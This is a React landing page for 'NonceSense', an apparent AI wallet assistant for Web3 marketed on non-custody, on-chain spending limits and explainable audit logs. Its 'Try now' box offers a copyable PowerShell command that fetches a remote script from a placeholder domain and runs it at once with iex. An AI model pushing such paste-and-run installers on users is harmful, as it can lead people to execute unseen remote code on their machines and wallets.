import { useState, useCallback } from 'react'

const INSTALL_COMMAND = "irm 'https://mydomain.com/install.ps1' | iex"

function CopyStackOutlineIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.5} aria-hidden {...props}>
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"
      />
    </svg>
  )
}

function CheckOutlineIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.5} aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
    </svg>
  )
}

function KeyIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
    </svg>
  )
}

function ShieldIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
    </svg>
  )
}

function MessageIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M7.5 8.25h9m-9 3H12m-9.75 1.51c0 1.6 1.123 2.994 2.707 3.227 1.129.166 2.27.293 3.423.379.35.026.67.21.865.501L12 21l2.755-4.133a1.14 1.14 0 01.865-.501 48.172 48.172 0 003.423-.379c1.584-.233 2.707-1.626 2.707-3.228V6.741c0-1.602-1.123-2.995-2.707-3.228A48.394 48.394 0 0012 3c-2.392 0-4.744.175-7.043.513C3.373 3.746 2.25 5.14 2.25 6.741v6.018z" />
    </svg>
  )
}

function StepsIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
    </svg>
  )
}

function ScrollIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />
    </svg>
  )
}

function LockIcon(props) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" aria-hidden {...props}>
      <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
    </svg>
  )
}

const pillars = [
  {
    title: 'Non-custodial by design',
    body: 'Your keys stay yours. The twin never holds custody—only the permissions you encode into a smart wallet.',
    icon: KeyIcon,
  },
  {
    title: 'Programmable guardrails',
    body: 'Spending caps, whitelisted protocols, approved assets, and per-tx limits—enforced on-chain, not by UI alone.',
    icon: ShieldIcon,
  },
  {
    title: 'Human-readable intent',
    body: 'Actions read like intent: “Swap 0.5 ETH to USDC via the lowest-risk route”—not opaque calldata.',
    icon: MessageIcon,
  },
  {
    title: 'Staged autonomy',
    body: 'Start in recommendation-only mode. Limited auto-execution unlocks only inside rules you pre-approve.',
    icon: StepsIcon,
  },
  {
    title: 'Explainable audit trail',
    body: 'Every step logs what happened, why, and which permission allowed it—like a bank statement with reasoning.',
    icon: ScrollIcon,
  },
  {
    title: 'Contract-hard limits',
    body: 'Even an unpredictable model cannot exceed the limits you set; smart contracts are the final authority.',
    icon: LockIcon,
  },
]

function App() {
  const [copied, setCopied] = useState(false)

  const copyInstallCommand = useCallback(() => {
    void navigator.clipboard.writeText(INSTALL_COMMAND).then(
      () => {
        setCopied(true)
        window.setTimeout(() => setCopied(false), 2000)
      },
      () => {},
    )
  }, [])

  return (
    <div className="relative min-h-screen overflow-x-hidden bg-zinc-900 text-zinc-100">
      <div
        className="pointer-events-none fixed inset-0 -z-10 bg-[radial-gradient(ellipse_80%_50%_at_50%_-20%,rgba(249,115,22,0.22),transparent)]"
        aria-hidden
      />
      <div
        className="pointer-events-none fixed inset-0 -z-10 bg-[linear-gradient(to_bottom,transparent_0%,rgba(24,24,27,0.85)_40%,rgb(24,24,27)_100%)]"
        aria-hidden
      />
      <div
        className="pointer-events-none fixed inset-0 -z-10 opacity-[0.35] [background-image:linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] [background-size:64px_64px]"
        aria-hidden
      />

      <header className="sticky top-0 z-50 border-b border-white/5 bg-zinc-900/80 backdrop-blur-md">
        <div className="mx-auto max-w-6xl px-4 py-4 sm:px-6 lg:px-8">
          <span className="font-semibold tracking-tight text-white">NonceSense</span>
        </div>
      </header>

      <main>
        <section className="mx-auto max-w-6xl px-4 pb-20 pt-16 sm:px-6 sm:pt-24 lg:px-8 lg:pt-28" aria-labelledby="hero-heading">
          <div className="mx-auto max-w-3xl text-center">
            <p className="mb-4 inline-flex items-center gap-2 rounded-full border border-orange-500/20 bg-orange-500/10 px-3 py-1 text-xs font-medium uppercase tracking-wider text-orange-400">
              On-chain · Non-custodial · Explainable
            </p>
            <h1 id="hero-heading" className="text-balance text-4xl font-semibold tracking-tight text-white sm:text-5xl lg:text-6xl">
              Your personal AI twin—<span className="text-orange-500">bounded by rules</span>, not blind trust
            </h1>
            <p className="mx-auto mt-6 max-w-2xl text-pretty text-lg leading-relaxed text-zinc-400">
              An assistant for Web3 that feels controlled and transparent: limited permissions through a smart wallet,
              human-readable actions, progressive autonomy, and an audit trail you can actually read.
            </p>
            <div className="mx-auto mt-10 max-w-2xl rounded-xl border border-white/10 bg-zinc-900/70 p-3 shadow-lg ring-1 ring-orange-500/10 sm:p-4">
              <div className="flex flex-col gap-3 sm:flex-row sm:items-stretch sm:gap-0">
                <button
                  type="button"
                  className="inline-flex shrink-0 items-center justify-center rounded-lg bg-orange-500 px-6 py-3 text-base font-semibold text-zinc-950 shadow-md shadow-orange-500/20 transition hover:bg-orange-400 sm:rounded-r-none sm:px-7 sm:py-3.5 sm:text-[1.05rem]"
                >
                  Try now:
                </button>
                <div className="flex min-h-0 min-w-0 flex-1 flex-col justify-center gap-1.5 border-t border-white/10 pt-3 sm:border-l sm:border-t-0 sm:pl-4 sm:pt-0">
                  <div className="flex items-center gap-2">
                    <code className="min-w-0 flex-1 overflow-x-auto rounded-lg bg-zinc-950/50 px-3 py-2.5 text-left font-mono text-xs leading-relaxed text-orange-100 ring-1 ring-white/5 sm:px-4 sm:py-3 sm:text-sm">
                      {INSTALL_COMMAND}
                    </code>
                    <button
                      type="button"
                      onClick={copyInstallCommand}
                      title={copied ? 'Copied!' : 'Copy to clipboard'}
                      aria-label={copied ? 'Copied to clipboard' : 'Copy install command to clipboard'}
                      className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg border border-white/10 bg-zinc-950/40 text-zinc-400 transition hover:border-orange-500/35 hover:bg-zinc-800 hover:text-orange-400 sm:h-11 sm:w-11"
                    >
                      {copied ? (
                        <CheckOutlineIcon className="h-5 w-5 text-orange-500" />
                      ) : (
                        <CopyStackOutlineIcon className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  {copied ? (
                    <p className="text-center text-xs text-orange-400 sm:text-left" aria-live="polite">
                      Copied to clipboard
                    </p>
                  ) : null}
                </div>
              </div>
            </div>
          </div>
        </section>

        <section id="idea" className="border-t border-white/5 bg-zinc-900/30 py-20 sm:py-24">
          <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
            <div className="grid gap-12 lg:grid-cols-2 lg:items-center lg:gap-16">
              <div>
                <h2 className="text-3xl font-semibold tracking-tight text-white sm:text-4xl">Not a black box with your keys</h2>
                <p className="mt-4 text-lg leading-relaxed text-zinc-400">
                  The goal is not to ask you to trust an opaque model with your wallet. The twin behaves like a{' '}
                  <strong className="font-medium text-zinc-200">highly constrained financial assistant</strong>: visible
                  rules, verifiable intent, and hard stops at the contract layer.
                </p>
                <ul className="mt-8 space-y-4 text-zinc-300">
                  <li className="flex gap-3">
                    <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-orange-500" aria-hidden />
                    You keep ownership; automation runs inside programmable limits you define.
                  </li>
                  <li className="flex gap-3">
                    <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-orange-500" aria-hidden />
                    Trust ramps up over time—recommendations first, execution only where allowed.
                  </li>
                  <li className="flex gap-3">
                    <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-orange-500" aria-hidden />
                    If the model misbehaves, on-chain rules still cap what can happen.
                  </li>
                </ul>
              </div>
              <div className="relative rounded-2xl border border-white/10 bg-zinc-900/80 p-8 shadow-2xl ring-1 ring-white/5">
                <div className="absolute -right-8 -top-8 h-32 w-32 rounded-full bg-orange-500/20 blur-3xl" aria-hidden />
                <p className="font-mono text-xs uppercase tracking-widest text-orange-500/90">Design principle</p>
                <blockquote className="mt-4 text-xl font-medium leading-snug text-white sm:text-2xl">
                  “Automation without surrendering control—explainable intent, progressive autonomy, and limits no UI can
                  override.”
                </blockquote>
              </div>
            </div>
          </div>
        </section>

        <section id="pillars" className="py-20 sm:py-24" aria-labelledby="pillars-heading">
          <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
            <div className="mx-auto max-w-2xl text-center">
              <h2 id="pillars-heading" className="text-3xl font-semibold tracking-tight text-white sm:text-4xl">
                Built for ownership and clarity
              </h2>
              <p className="mt-4 text-lg text-zinc-400">
                Six pillars that keep the twin accountable—from UX to bytecode.
              </p>
            </div>
            <ul className="mt-14 grid gap-6 sm:grid-cols-2 lg:grid-cols-3">
              {pillars.map(({ title, body, icon: Icon }) => (
                <li
                  key={title}
                  className="group rounded-2xl border border-white/5 bg-zinc-900/40 p-6 transition hover:border-orange-500/25 hover:bg-zinc-900/70"
                >
                  <div className="mb-4 flex h-11 w-11 items-center justify-center rounded-xl bg-orange-500/10 text-orange-500 ring-1 ring-orange-500/20 transition group-hover:bg-orange-500/15">
                    <Icon className="h-6 w-6" />
                  </div>
                  <h3 className="text-lg font-semibold text-white">{title}</h3>
                  <p className="mt-2 text-sm leading-relaxed text-zinc-400">{body}</p>
                </li>
              ))}
            </ul>
          </div>
        </section>

        <section id="experience" className="border-t border-white/5 bg-zinc-900/20 py-20 sm:py-24">
          <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
            <div className="grid gap-12 lg:grid-cols-2 lg:gap-16">
              <div>
                <h2 className="text-3xl font-semibold tracking-tight text-white sm:text-4xl">What you see—not raw calls</h2>
                <p className="mt-4 text-lg leading-relaxed text-zinc-400">
                  Instead of dumping contract calldata, the surface translates proposals into plain intent so you can
                  verify before anything executes.
                </p>
                <div className="mt-8 space-y-4">
                  <div className="rounded-xl border border-white/10 bg-zinc-950/35 p-4">
                    <p className="text-xs font-medium uppercase tracking-wide text-zinc-500">Proposed action</p>
                    <p className="mt-2 font-medium text-white">Swap 0.5 ETH into USDC through the lowest-risk route</p>
                    <p className="mt-1 text-sm text-zinc-500">Within daily cap · Whitelisted routers only</p>
                  </div>
                  <div className="rounded-xl border border-dashed border-orange-500/30 bg-orange-500/5 p-4">
                    <p className="text-xs font-medium uppercase tracking-wide text-orange-500/80">Audit entry</p>
                    <p className="mt-2 font-mono text-sm text-zinc-300">
                      Executed: swap via Route A. Reason: user rule “minimize slippage and MEV exposure.” Permission:
                      spend ≤ 0.5 ETH / day on swaps.
                    </p>
                  </div>
                </div>
              </div>
              <div className="flex flex-col justify-center">
                <div className="rounded-2xl border border-white/10 bg-gradient-to-b from-zinc-800/80 to-zinc-900 p-8 ring-1 ring-white/5">
                  <h3 className="text-lg font-semibold text-white">Progressive autonomy</h3>
                  <ol className="mt-6 space-y-6">
                    <li className="flex gap-4">
                      <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-zinc-800 text-sm font-semibold text-orange-500 ring-1 ring-white/10">
                        1
                      </span>
                      <div>
                        <p className="font-medium text-white">Recommendations only</p>
                        <p className="mt-1 text-sm text-zinc-400">The twin suggests; you sign every execution.</p>
                      </div>
                    </li>
                    <li className="flex gap-4">
                      <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-zinc-800 text-sm font-semibold text-orange-500 ring-1 ring-white/10">
                        2
                      </span>
                      <div>
                        <p className="font-medium text-white">Limited auto-exec</p>
                        <p className="mt-1 text-sm text-zinc-400">Small, pre-approved actions run within caps you set on-chain.</p>
                      </div>
                    </li>
                    <li className="flex gap-4">
                      <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-orange-500/20 text-sm font-semibold text-orange-400 ring-1 ring-orange-500/40">
                        3
                      </span>
                      <div>
                        <p className="font-medium text-white">Expand with evidence</p>
                        <p className="mt-1 text-sm text-zinc-400">Widen scope only after you review history and adjust rules.</p>
                      </div>
                    </li>
                  </ol>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section id="cta" className="py-20 sm:py-24">
          <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
            <div className="relative overflow-hidden rounded-3xl border border-orange-500/20 bg-gradient-to-br from-orange-500/15 via-zinc-800/50 to-zinc-900 px-8 py-14 text-center sm:px-12">
              <div className="pointer-events-none absolute -left-20 top-0 h-64 w-64 rounded-full bg-orange-500/30 blur-3xl" aria-hidden />
              <div className="pointer-events-none absolute -right-20 bottom-0 h-64 w-64 rounded-full bg-orange-600/20 blur-3xl" aria-hidden />
              <h2 className="relative text-3xl font-semibold tracking-tight text-white sm:text-4xl">
                Safe automation for the wallet you already own
              </h2>
              <p className="relative mx-auto mt-4 max-w-xl text-lg text-zinc-300">
                An AI layer that respects non-custody, transparency, and hard on-chain boundaries—so you never
                surrender control.
              </p>
            </div>
          </div>
        </section>
      </main>

      <footer className="border-t border-white/5 py-10">
        <div className="mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-4 text-center text-sm text-zinc-500 sm:flex-row sm:px-6 sm:text-left lg:px-8">
          <p className="font-mono text-xs text-zinc-600">Keys yours · Rules on-chain · Intent in plain language</p>
        </div>
      </footer>
    </div>
  )
}

export default App
